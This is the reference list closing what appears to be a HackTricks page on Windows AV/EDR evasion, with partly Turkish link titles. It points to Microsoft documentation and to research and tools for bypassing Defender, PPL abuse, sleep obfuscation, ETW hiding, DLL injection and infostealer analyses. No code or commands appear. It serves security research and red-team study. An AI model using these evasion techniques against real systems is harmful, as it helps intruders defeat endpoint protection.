- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU referansı (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR'lara karşı koymak](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect tekniğiyle Windows Defender'ın koruyucu kabuğunu kırmak](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut referansı](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain'ın ardında: RAT'ten Builder'a, Builder'dan Coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer şehre geliyor: Yeni ve iddialı bir Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware'ini etkisiz kılmak](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace ile Adaptix'i uykuya yatırmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW'nizi gizlemek](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop'ı kötüye kullanmak: Uygulamalı bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender'ın remediation driver'ını kernel operation primitive olarak weaponize etmek](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo yardımcı kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak self-masking function'lar oluşturmak](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yönlendirilmiş giriş ve çıkışla child process oluşturmak](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge ile C# araçlarını yeniden oluşturmak](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET projelerini derlemek](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept ve kaynak kodu](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Shellcodeless DLL injection için thread pool iç işleyişini kötüye kullanmak](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
{{#include ../banners/hacktricks-training.md}}
